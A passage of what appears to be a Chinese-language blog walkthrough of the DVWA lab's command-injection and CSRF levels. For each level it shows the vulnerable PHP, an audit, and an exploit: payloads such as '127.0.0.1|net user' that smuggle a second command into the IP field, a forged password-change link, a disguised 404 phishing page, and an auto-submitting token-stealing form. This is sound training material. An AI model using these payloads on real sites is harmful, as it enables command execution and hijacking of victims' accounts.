-c 4 '</span> . <span class="variable">$target</span> );    </span><br><span class="line">    &#125;   </span><br><span class="line">    // Feedback <span class="keyword">for</span> the end user   </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$cmd</span>&#125;&lt;/pre&gt;"</span>;    </span><br><span class="line">&#125;    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-5"><a href="#审计-5" class="headerlink" title="审计:"></a>审计:</h4><p>对输入的参数做了黑名单限制，即把”&amp;&amp;” 、”;”删除，因此依旧存在依旧安全漏洞</p><h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>由于把&amp;&amp;加入了黑名单，我们可以使用&amp;，两者的区别是前者第一条语句返回为真，第二个语句才会执行，后者为无论第一条语句如何，第二条语句都会执行</p><ul><li>127.0.0.1&amp;net user<br><img src="cinjection03.png" alt=""></li></ul><p>str_replace把”&amp;&amp;” 、”;”替换为空字符，因此可以采用以下方式绕过：;直接回替换为空字符串，整条语句会变成127.0.0.1&amp;&amp; ipconfig</p><ul><li>127.0.0.1&amp;;&amp;ipconfig<br><img src="cinjection05.png" alt=""></li></ul><h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">'ip'</span> ]); </span><br><span class="line"></span><br><span class="line">    // Set blacklist </span><br><span class="line"></span><br><span class="line">    <span class="variable">$substitutions</span> = array( </span><br><span class="line"></span><br><span class="line">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'|  '</span> =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'('</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">')'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">        <span class="string">'||'</span> =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">    ); </span><br><span class="line"></span><br><span class="line">    // Remove any of the charactars <span class="keyword">in</span> the array (blacklist). </span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> ); </span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping <span class="built_in">command</span>. </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // Windows </span><br><span class="line"></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  '</span> . <span class="variable">$target</span> ); </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line"></span><br><span class="line">        // *nix </span><br><span class="line"></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  -c 4 '</span> . <span class="variable">$target</span> ); </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    // Feedback <span class="keyword">for</span> the end user </span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$cmd</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-6"><a href="#审计-6" class="headerlink" title="审计"></a>审计</h4><p>看起来，黑名单都把特殊字符限制了，但是聪明的一定会注意到”| ”有一个空格，因此我们可以使用这个绕过<br>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p><h4 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li>127.0.0.1|net user<br><img src="cinjection06.png" alt=""></li></ul><h3 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line"></span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line"></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">'ip'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = stripslashes( <span class="variable">$target</span> ); </span><br><span class="line"></span><br><span class="line">    // Split the IP into 4 octects </span><br><span class="line"></span><br><span class="line">    <span class="variable">$octet</span> = explode( <span class="string">"."</span>, <span class="variable">$target</span> ); </span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an <span class="built_in">integer</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( <span class="variable">$octet</span>[0] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[1] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[2] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[3] ) ) &amp;&amp; ( sizeof( <span class="variable">$octet</span> ) == 4 ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // If all 4 octets are int<span class="string">'s put the IP back together. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $target = $octet[0] . '</span>.<span class="string">' . $octet[1] . '</span>.<span class="string">' . $octet[2] . '</span>.<span class="string">' . $octet[3]; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Determine OS and execute the ping command. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if( stristr( php_uname( '</span>s<span class="string">' ), '</span>Windows NT<span class="string">' ) ) &#123; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            // Windows </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            $cmd = shell_exec( '</span>ping  <span class="string">' . $target ); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#125; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        else &#123; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            // *nix </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            $cmd = shell_exec( '</span>ping  -c 4 <span class="string">' . $target ); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#125; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Feedback for the end user </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    else &#123; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Ops. Let the user name theres a mistake </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        echo '</span>&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;<span class="string">'; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Generate Anti-CSRF token </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">generateSessionToken(); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="审计-7"><a href="#审计-7" class="headerlink" title="审计"></a>审计</h4><p>Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p><h2 id="CSRF-Cross-site-request-forgery"><a href="#CSRF-Cross-site-request-forgery" class="headerlink" title="CSRF(Cross-site request forgery)"></a>CSRF(Cross-site request forgery)</h2><p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用<br><img src="csrf01.png" alt=""></p><h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_GET</span>[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Do the passwords match? </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123; </span><br><span class="line">        // They <span class="keyword">do</span>! </span><br><span class="line">        <span class="variable">$pass_new</span> = mysql_real_escape_string( <span class="variable">$pass_new</span> ); </span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> ); </span><br><span class="line"></span><br><span class="line">        // Update the database </span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">"UPDATE `users` SET password = '<span class="variable">$pass_new</span>' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        <span class="variable">$result</span> = mysql_query( <span class="variable">$insert</span> ) or die( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">        // Feedback <span class="keyword">for</span> the user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // Issue with passwords matching </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-8"><a href="#审计-8" class="headerlink" title="审计"></a>审计</h4><p>可以看到的是直接对比检查参数password_new与password_conf是否一致，如果一致就直接修改代码</p><h4 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li>构造链接<blockquote><p><a href="http://dvwa.com/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#" target="_blank" rel="noopener">http://dvwa.com/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</a></p></blockquote></li></ul><p>当受害者点击了这个链接之后，就会更改密码，当然，一般都是需要你登陆之后的，这里面有体现，但是大家会有疑问，这个链接太直白了，懂一点的人就直接不会点了呀。</p><ul><li>使用短链接来隐藏url<br>可以使用百度短网址，将地址缩短进行伪装</li></ul><p>上述两种方法都可以在同个浏览器访问已经同个网站的时候才可以生效，但是受害者最终还是能看到密码修改成功的页面，所以还需要进一步伪装</p><ul><li>构造钓鱼页面<br>在公网服务器上上传一个攻击页面，诱骗受害者去访问，并且不做任何跳转，如下的简单的页面</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"http://dvwa.com/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#"</span>/&gt; </span><br><span class="line">&lt;h1&gt;404&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;file not found.&lt;/h2&gt;</span><br></pre></td></tr></table></figure><h3 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Checks to see where the request came from </span></span><br><span class="line">    <span class="keyword">if</span>( eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ) ) &#123; </span><br><span class="line">        <span class="comment">// Get input </span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match? </span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            <span class="comment">// They do! </span></span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">            $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database </span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">            $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Issue with passwords matching </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Didn't come from a trusted source </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line"><span class="comment">#### 代码审计</span></span><br><span class="line"></span><br><span class="line">int eregi(string pattern, string string)</span><br><span class="line">检查string中是否含有pattern（不区分大小写），如果有返回<span class="keyword">True</span>，反之<span class="keyword">False</span></span><br><span class="line">Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是<span class="number">192.168</span><span class="number">.153</span><span class="number">.130</span>），希望通过这种机制抵御CSRF攻击</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 漏洞利用</span></span><br><span class="line"></span><br><span class="line">过滤规则是http包头的Referer参数的值中必须包含主机名（这里是<span class="number">192.168</span><span class="number">.242</span><span class="number">.132</span>）</span><br><span class="line">直接将上一等级的页面名字改为<span class="number">192.168</span><span class="number">.242</span><span class="number">.132</span>就可以了</span><br><span class="line"></span><br><span class="line"><span class="comment">### High</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">        <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">        checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Get input </span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Do the passwords match? </span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            <span class="comment">// They do! </span></span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">            $pass_new = md5( $pass_new ); </span><br><span class="line">    </span><br><span class="line">            <span class="comment">// Update the database </span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">            $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line">    </span><br><span class="line">            <span class="comment">// Feedback for the user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Issue with passwords matching </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    </span><br><span class="line">        mysql_close(); </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">    generateSessionToken(); </span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span> </span><br><span class="line">```    </span><br><span class="line"></span><br><span class="line"><span class="comment">#### 代码审计</span></span><br><span class="line"></span><br><span class="line">High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 漏洞利用</span></span><br><span class="line">要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</span><br><span class="line">试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。</span><br><span class="line"></span><br><span class="line">``` bash</span><br><span class="line">    &lt;!DOCTYPE html&gt;</span><br><span class="line">    &lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">        &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">        &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">csrfAttack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                document.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value=document.getElementById(<span class="string">"tokenwindow"</span>).contentWindow.document.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value;</span><br><span class="line">                document.getElementsById(<span class="string">"submitform"</span>).submit();</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body onload=<span class="string">"csrfAttack()"</span>&gt;</span><br><span class="line">    &lt;iframe src=<span class="string">"http://dvwa.com/DVWA/vulnerabilities/csrf/"</span> id=<span class="string">"tokenwindow"</span> frameborder=<span class="string">"0"</span> style=<span class="string">"display: none"</span>&gt;&lt;/iframe&gt;</span><br><span class="line">    &lt;form action=<span class="string">"http://dvwa.com/DVWA/vulnerabilities/csrf/"</span> method=<span class="string">"get"</span> id=<span class="string">"submitform"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_new"</span> value=<span class="string">"password"</span>&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_conf"</span> value=<span class="string">"password"</span>&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"user_token"</span> value=<span class="string">""</span>&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"Change"</span> value=<span class="string">"Change"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>将上述页面放置在攻击者服务器里面，让受害者点击完成CSRF攻击。代码思路是通过隐藏的iframe加载访问修改密码的页面，获取页面中的token，并像服务器发送改密码请求。</p><p>但是浏览有自带的防范机制，不准跨域，攻击者服务器域名下不允许获取被攻击服务器的页面内容。因此上述代码只是理论上能实现，因此我们需要将攻击代码注入到被攻击者服务器上，才有可能完成攻击。<br>等学习到了XSS注入再更</p><h3 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 